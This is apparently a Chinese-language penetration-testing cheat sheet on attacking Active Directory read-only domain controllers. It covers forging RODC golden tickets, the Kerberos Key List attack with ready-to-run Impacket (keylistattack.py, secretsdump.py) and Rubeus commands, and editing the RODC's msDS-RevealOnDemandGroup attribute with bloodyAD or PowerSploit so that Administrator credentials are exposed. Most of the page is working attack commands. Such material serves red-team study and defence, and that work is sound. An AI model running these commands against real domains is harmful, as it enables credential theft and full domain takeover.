# Active Directory - 只读域控制器

RODC 是在物理安全性较低的位置部署域控制器的替代方案。

- 包含 AD 的过滤副本（LAPS 和 Bitlocker 密钥被排除在外）
- 在 RODC 的 **managedBy** 属性中指定的任何用户或组都具有 RODC 服务器的本地管理员访问权限

## RODC 黄金票据

- 你可以伪造 RODC 黄金票据并将其提交给可写域控制器，但仅适用于在 RODC 的 **msDS-RevealOnDemandGroup** 属性中列出且不在 RODC 的 **msDS-NeverRevealGroup** 属性中的主体

## RODC 密钥列表攻击

**前提条件**：

- [Impacket PR #1210 - The Kerberos Key List Attack](https://github.com/SecureAuthCorp/impacket/pull/1210)
- RODC 的 **krbtgt** 凭据（-rodcKey）
- RODC 的 **krbtgt 帐户 ID**（-rodcNo）

**利用方法**：

- 使用 Impacket

  ```ps1
  # keylistattack.py 使用 SAMR 用户枚举，不进行过滤（-full 标志）
  keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full

  # keylistattack.py 指定目标用户名（-t 标志）
  keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST

  # secretsdump.py 使用 Kerberos 密钥列表攻击选项（-use-keylist）
  secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
  ```

- 使用 Rubeus

  ```ps1
  Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
  Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
  ```

## RODC 计算机对象

当你对 RODC 计算机对象拥有以下权限之一时：**GenericWrite**、**GenericAll**、**WriteDacl**、**Owns**、**WriteOwner**、**WriteProperty**。

- 将域管理员帐户添加到 RODC 的 **msDS-RevealOnDemandGroup** 属性
    - Windows/Linux：

    ```ps1
    # 获取原始 msDS-RevealOnDemandGroup 值
    bloodyAD --host 10.10.10.10 -d domain.local -u username -p pass123 get object 'RODC$' --attr msDS-RevealOnDemandGroup
    distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local
    msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local
    # 添加之前的值加上管理员帐户
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
    ```

    - 仅 Windows：

  ```ps1
  PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
  ```

## 参考资料

- [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
- [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
- [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
